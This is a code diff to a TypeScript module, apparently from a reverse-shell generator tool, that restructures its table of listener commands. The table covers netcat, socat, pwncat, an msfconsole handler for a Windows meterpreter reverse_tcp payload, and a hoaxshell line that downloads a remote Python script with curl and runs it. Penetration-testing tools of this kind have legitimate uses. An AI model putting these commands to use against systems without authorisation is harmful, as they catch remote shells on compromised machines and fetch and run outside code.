@@ -8,10 +8,9 @@ export type IListenerCommand = {
 }
 
 export const LISTENER_TYPES = [
-  { label: 'Bash', value: 'bash' },
+  { label: 'Busybox Netcat', value: 'busybox nc' },
   { label: 'Netcat', value: 'nc' },
   { label: 'Netcat FreeBSD', value: 'nc freebsd' },
-  { label: 'Busybox Netcat', value: 'busybox nc' },
   { label: 'NCat', value: 'ncat' },
   { label: 'NCat.exe', value: 'ncat.exe' },
   { label: 'NCat (TLS)', value: 'ncat (TLS)' },
@@ -27,25 +26,37 @@ export const LISTENER_TYPES = [
 ]
 
 export const LISTENER_COMMANDS = [
-  { nc: 'nc -lvnp {port}' },
-  { 'nc freebsd': 'nc -lvn {port}' },
-  { 'busybox nc': 'busybox nc -lp {port}' },
-  { ncat: 'ncat -lvnp {port}' },
-  { 'ncat.exe': 'ncat.exe -lvnp {port}' },
-  { 'ncat (TLS)': 'ncat --ssl -lvnp {port}' },
-  { 'rlwrap + nc': 'rlwrap -cAr nc -lvnp {port}' },
-  { rustcat: 'rcat listen {port}' },
-  { pwncat: 'python3 -m pwncat -lp {port}' },
-  { 'windows ConPty': 'stty raw -echo; (stty size; cat) | nc -lvnp {port}' },
-  { socat: 'socat -d -d TCP-LISTEN:{port} STDOUT' },
-  { 'socat (TTY)': 'socat -d -d file:`tty`:raw:echo=0 TCP-LISTEN:{port}' },
-  { powercat: 'powercat -l -p {port}' },
+  { key: 'nc', value: 'nc -lvnp {port}' },
+  { key: 'nc freebsd', value: 'nc -lvn {port}' },
+  { key: 'busybox nc', value: 'busybox nc -lp {port}' },
+  { key: 'ncat', value: 'ncat -lvnp {port}' },
+  { key: 'ncat.exe', value: 'ncat.exe -lvnp {port}' },
+  { key: 'ncat (TLS)', value: 'ncat --ssl -lvnp {port}' },
+  { key: 'rlwrap + nc', value: 'rlwrap -cAr nc -lvnp {port}' },
+  { key: 'rustcat', value: 'rcat listen {port}' },
+  { key: 'pwncat', value: 'python3 -m pwncat -lp {port}' },
+  { key: 'windows ConPty', value: 'stty raw -echo; (stty size; cat) | nc -lvnp {port}' },
+  { key: 'socat', value: 'socat -d -d TCP-LISTEN:{port} STDOUT' },
+  { key: 'socat (TTY)', value: 'socat -d -d file:`tty`:raw:echo=0 TCP-LISTEN:{port}' },
+  { key: 'powercat', value: 'powercat -l -p {port}' },
   {
-    msfconsole:
-      'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'
+    key: 'msfconsole',
+    value:
+      'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit"'
   },
   {
-    hoaxshell:
+    key: 'hoaxshell',
+    value:
       'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}'
   }
 ]
+
+export const getListenerCommand = (type: string, port: string, ip?: string) => {
+  const command = LISTENER_COMMANDS.find((item) => item.key === type)?.value
+
+  if (!command) {
+    return ''
+  }
+
+  return command.replace('{port}', port).replace('{ip}', ip || '')
+}
